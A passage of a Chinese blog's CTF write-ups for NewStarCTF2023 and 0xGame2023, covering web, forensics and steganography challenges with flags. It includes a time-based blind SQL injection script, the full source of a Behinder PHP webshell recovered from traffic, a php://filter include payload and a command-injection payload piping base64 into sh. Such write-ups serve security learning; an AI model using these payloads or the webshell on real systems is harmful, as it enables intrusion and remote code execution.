class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time <br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    left=<span class="hljs-number">32</span><br>    right=<span class="hljs-number">128</span><br>    <span class="hljs-built_in">print</span>(i)<br>    mid=(left+right)//<span class="hljs-number">2</span><br>    <br>    <span class="hljs-keyword">while</span>(left&lt;right):<br>        <span class="hljs-comment"># url=f&quot;http://120fd531-928e-47d1-a720-425fc6e7d6cc.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)#&quot;</span><br>        <br>        <span class="hljs-comment"># url=f&quot;http://120fd531-928e-47d1-a720-425fc6e7d6cc.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)#&quot;</span><br><br>        <span class="hljs-comment"># url=f&quot;http://120fd531-928e-47d1-a720-425fc6e7d6cc.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)#&quot;</span><br>        <br>        url=<span class="hljs-string">f&quot;http://120fd531-928e-47d1-a720-425fc6e7d6cc.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span><br><br>        start_time= time.time()<br>        res=requests.get(url=url)<br>        end_time = time.time()<br>        t = end_time - start_time<br>        <br>        <span class="hljs-keyword">if</span>(t&gt;<span class="hljs-number">2</span>):<span class="hljs-comment">#成功运行</span><br>            left=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right=mid<br>        mid=(left+right)//<span class="hljs-number">2</span><br>    <br>    result+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#information_schema,mysql,performance_schema,sys,test,ctf</span><br><span class="hljs-comment">#iteos</span><br><span class="hljs-comment">#id,name,price</span><br><span class="hljs-comment">#1lolita1000,520lolita&#x27;s flag is flag&#123;9bc00737-790e-4aee-9555-7f961161b8f0&#125;1688 </span><br></code></pre></td></tr></table></figure><h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc"></a>Misc</h2><h3 id="R通大残"><a href="#R通大残" class="headerlink" title="R通大残"></a>R通大残</h3><p>题目附件黑不拉几一看，010看不出来，修改高度也没变化</p><p>想到RGB通道的R通道隐写，stegslove查看</p><p>果然上方有藏东西</p><p>单独提取R通道所有内容，得到flag</p><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><blockquote><p>请给出Nmap扫描得到所有的开放端口用英文逗号分隔，端口号从小到大排列。 例如flag{21,22,80,8080} nmap.pcap</p></blockquote><p>如果成功建立连接的话，服务器会发送一个<code>synack</code>字段</p><p>筛选一下<code>tcp.connection.synack</code></p><p><img src="/2023/10/23/NewStarCTF2023/1698305204342.png" alt="1698305204342"></p><p>flag{80,3306,5000,7000,8021,9000}</p><h3 id="依旧是空白"><a href="#依旧是空白" class="headerlink" title="依旧是空白"></a>依旧是空白</h3><p>给了两个附件，一个是图片，一个是txt文件</p><p>打开图片看不到什么，010查看crc报错，爆破宽高并修改</p><p>得到password:s00_b4by_f0r_y0u</p><p>这次是snow加密：</p><p>SNOW 是 the Steganographic Nature Of Whitespace 的简写。</p><p>SNOW 用于通过在行尾附加空格和制表符来隐藏 ASCII 文本中的消息，即<strong>文本隐写</strong>。由于空格和制表符在文本查看器中通常不可见，因此消息实际上对不经意的观察者隐藏。并且如果使用内置加密，即使检测到消息也无法读取。</p><table><thead><tr><th><strong>参数</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>-C</td><td>如果隐藏，则压缩数据，或者如果提取，则会解压缩。</td></tr><tr><td>-Q</td><td>静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量。</td></tr><tr><td>-S</td><td>报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项。</td></tr><tr><td>-p password</td><td>如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密。</td></tr><tr><td>-l line-length</td><td>在附加空格时，Snow将始终产生比此值短的线条。默认情况下，它设置为80。</td></tr><tr><td>-f message-file</td><td>此文件的内容将隐藏在输入文本文件中。</td></tr><tr><td>-m message-string</td><td>此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取邮件时，否则不会打印换行符。</td></tr></tbody></table><p><code>SNOW.EXE -C -p &quot;s00_b4by_f0r_y0u&quot; infile outfile</code></p><p>查看outfile里面的内容得到</p><p>flag{2b29e3e0-5f44-402b-8ab3-35548d7a6a11}</p><h3 id="3-溯源"><a href="#3-溯源" class="headerlink" title="3-溯源"></a>3-溯源</h3><blockquote><p>在调查清楚攻击者的攻击路径后你暗暗松了一口气，但是攻击者仍控制着服务器，眼下当务之急是继续深入调查攻击者对服务器进行了什么操作，同时调查清楚攻击者的身份，请你分析攻击者与WebShell通讯的流量获取攻击者获取的相关信息，目前可以得知的是攻击者使用了冰蝎进行WebShell连接。 Tip：沿着前序题目的进度分析会更符合逻辑，或许有助于解题 FLAG格式：flag{攻击者获取到的服务器用户名_服务器内网IP地址} 例如flag{web_10.0.0.3}</p></blockquote><p>顺着上一道题的思路有一个Shell：wh1t3g0d.php，继续分析</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.uri</span><span class="hljs-selector-class">.path</span> contains <span class="hljs-string">&quot;wh1t3g0d.php&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/1699184402246.png" alt="1699184402246"></p><p>可以看到写了一个shell</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>.request.uri <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;shell.php&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/1699184465266.png" alt="1699184465266"></p><p>注意到file_put_contents,写入了一个1.php，base64编码了，解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显的冰蝎Shell，发现后续的交互也主要是和1.php进行交互。</p><p>从这里可以得知key为<code>e45e329feb5d925b</code>，流量采用AES CBC 128加密，可以先把所有1.php的响应流量过滤出来：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>.response_for.uri <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;/1.php&quot;</span><br></code></pre></td></tr></table></figure><p>然后导出特定分组</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j4WlEW7HirOWaxK0Av0Bq+B<br>&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;d3d3LWRhdGEK&quot;&#125;<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span>www-data<br>&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;MTcyLjE3LjAuMgo=&quot;&#125;<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span>172.17.0.2<br></code></pre></td></tr></table></figure><p>flag{www-data_172.17.0.2}</p><h3 id="第一次取证"><a href="#第一次取证" class="headerlink" title="第一次取证"></a>第一次取证</h3><p>获取信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f dycqz<span class="hljs-selector-class">.raw</span> imageinfo<br></code></pre></td></tr></table></figure><p>查看进程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f dycqz<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 pslist<br></code></pre></td></tr></table></figure><p>查看notepad进程：</p><p>得到</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@iH</span>&lt;,&#123;<span class="hljs-selector-tag">BTrI</span>;(N[`j&amp;z+xcj9XE2!u/<span class="hljs-attribute">YbR</span>:<span class="hljs-number">4</span>gb2+ceDJs<span class="hljs-variable">@u6P</span><br></code></pre></td></tr></table></figure><p>base91解密</p><p>flag{a308067fc26625d31a421247adce3893}</p><h1 id="Week5"><a href="#Week5" class="headerlink" title="Week5"></a>Week5</h1><h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc"></a>Misc</h2><h3 id="隐秘的图片"><a href="#隐秘的图片" class="headerlink" title="隐秘的图片"></a>隐秘的图片</h3><p>给了两张二维码，第一张完好的扫出来假的flag</p><p><img src="/2023/10/23/NewStarCTF2023/key1.png" alt="key1"></p><p>第二张没有finder</p><p><img src="/2023/10/23/NewStarCTF2023/key2.png" alt="key2"></p><p>xqr脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment"># 读取原始图片</span><br>img1 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key1.png&#x27;</span>).convert(<span class="hljs-string">&#x27;1&#x27;</span>)<br>img2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key2.png&#x27;</span>).convert(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># 调整图片尺寸</span><br>img2 = img2.resize((<span class="hljs-number">297</span>,<span class="hljs-number">297</span>))<br><br><span class="hljs-comment"># 获取图片尺寸</span><br>width, height = img1.size<br><br><span class="hljs-comment"># 创建新图片对象</span><br>result = Image.new(<span class="hljs-string">&#x27;1&#x27;</span>, (width, height))<br><br><span class="hljs-comment"># 循环遍历像素并进行异或</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        pixel1 = img1.getpixel((x, y))<br>        pixel2 = img2.getpixel((x, y))<br>        result.putpixel((x, y), pixel1 ^ pixel2)<br><br><span class="hljs-comment"># 保存结果图片</span><br>result.save(<span class="hljs-string">&#x27;result.png&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/result.png" alt="result"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-wp-Web&amp;Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0xGame2023</title>
    <link href="/2023/10/22/0xGameCTF2023/"/>
    <url>/2023/10/22/0xGameCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><img src="/2023/10/22/0xGameCTF2023/1700037095487.png" alt="1700037095487"></p><p>在<code>main.js</code>中</p><h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><p>GET:<code>?a=s878926199a&amp;b=s155964671a</code></p><p>POST:<code>c=1024.5%00</code></p><p>Cookies:<code>name=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">43</span>bb3e24-<span class="hljs-number">0824</span>-<span class="hljs-number">48</span>cb-<span class="hljs-number">95</span>d0-c471540c0953&#125;<br></code></pre></td></tr></table></figure><h3 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h3><p><img src="/2023/10/22/0xGameCTF2023/1700037251506.png" alt="1700037251506"></p><p>其中一开始不知道<code>Cookie</code>具体的name，后来抓包得到</p><p><img src="/2023/10/22/0xGameCTF2023/1700037273882.png" alt="1700037273882"></p><h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h3><p>提示是<code>git</code>源码泄露</p><p>使用<code>githack</code>或者<code>githacker</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">githacker --url http://124.71.184.68:50013/.git/ --output-folder resul<br></code></pre></td></tr></table></figure><p><img src="/2023/10/22/0xGameCTF2023/1700037287833.png" alt="1700037287833"></p><p>进入<code>.git</code>（需要<code>ls -a</code>，被隐藏了）</p><p><img src="/2023/10/22/0xGameCTF2023/1700037299927.png" alt="1700037299927"></p><p>使用<code>git</code>命令</p><p><code>git log</code>查看日志发现有一条添加了flag</p><p>git show 日志的hash</p><p><img src="/2023/10/22/0xGameCTF2023/1700037312600.png" alt="1700037312600"></p><p><img src="/2023/10/22/0xGameCTF2023/1700037326449.png" alt="1700037326449"></p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>右键查看源码</p><p><img src="/2023/10/22/0xGameCTF2023/1700037419557.png" alt="1700037419557"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>  <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>猜测是前端过滤</p><p><code>burpsuite</code>抓包</p><p><img src="/2023/10/22/0xGameCTF2023/1700037434083.png" alt="1700037434083"></p><p>发现过滤了空格和&#x2F;，用${IFS}代替空格，再利用base64绕过</p><p>payload：<code>ip=127.0.0.1|echo$&#123;IFS&#125;&#39;Y2F0IC4uLy4uLy4uL2ZsYWc=&#39;$&#123;IFS&#125;|$&#123;IFS&#125;base64$&#123;IFS&#125;-d$&#123;IFS&#125;|$&#123;IFS&#125;sh</code></p><p><img src="/2023/10/22/0xGameCTF2023/1700037445981.png" alt="1700037445981"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">R0I0RU9ZTE5NVjVWT1pMTU1NWUcyWks3S1JYVjZNRFlJNVFXMlpKU0dBWkRHSUpCUFU9PT09PT0=<br></code></pre></td></tr></table></figure><p>放厨子解密</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-number">0</span>xGame&#123;Welc0me_To_0xGame2023!!&#125;<br></code></pre></td></tr></table></figure><h3 id="重生之我在教学楼打CS"><a href="#重生之我在教学楼打CS" class="headerlink" title="重生之我在教学楼打CS"></a>重生之我在教学楼打CS</h3><blockquote><p>一眼”鼎”真，flag也许就在脚下</p></blockquote><p>下载CS1.6，把附件的<code>.bsp</code>添加到<code>cs-strike</code>的<code>maps</code>下面加载地图</p><p>进入游戏找到鼎</p><p><img src="/2023/10/22/0xGameCTF2023/1700037459421.png" alt="1700037459421"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">0xGame</span><span class="hljs-template-variable">&#123;CS_very_good&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Shark-shark"><a href="#Shark-shark" class="headerlink" title="Shark shark"></a>Shark shark</h3><p><img src="/2023/10/22/0xGameCTF2023/1700037479420.png" alt="1700037479420"></p><p>压缩包，复制值去厨子导出<code>out.zip</code>，发现打开需要密码</p><p><img src="/2023/10/22/0xGameCTF2023/1700037493877.png" alt="1700037493877"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">very_safe_password</span>`打开`out.zip<br><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">7</span>a504dab-ada6-<span class="hljs-number">4</span>c41-adb3-<span class="hljs-number">0</span>d1530098cd4&#125;<br></code></pre></td></tr></table></figure><h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><blockquote><p>Hint 1: 如果我的hide是steghide那你该如何seek呢</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide info <span class="hljs-string">&#x27;/home/kali/Desktop/a.jpg&#x27;</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/10/22/0xGameCTF2023/1700037508875.png" alt="1700037508875"></p><p>猜测需要密码，使用<code>stegseek</code>进行爆破</p><p>stegseek a.jpg [wordlists]<br>不填wordlists，默认读取 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</p><p><img src="/2023/10/22/0xGameCTF2023/1700037521246.png" alt="1700037521246"></p><p><img src="/2023/10/22/0xGameCTF2023/1700037537522.png" alt="1700037537522"></p><h3 id="least-and-most"><a href="#least-and-most" class="headerlink" title="least and most"></a>least and most</h3><blockquote><p>小明刚学会两种新的隐写方式，他来出个题考考你了 </p></blockquote><p>放到<code>stegsolve.jar</code>看看<code>RGB</code>的<code>000</code>和<code>777</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">0xGame</span><span class="hljs-template-variable">&#123;lsb_combined_with_msb&#125;</span><br></code></pre></td></tr></table></figure><h3 id="another-signin"><a href="#another-signin" class="headerlink" title="another signin"></a>another signin</h3><blockquote><p>典中典之一搜就会的年轻人的第一道区块链签到</p><p>题目(提供源码，nc访问) 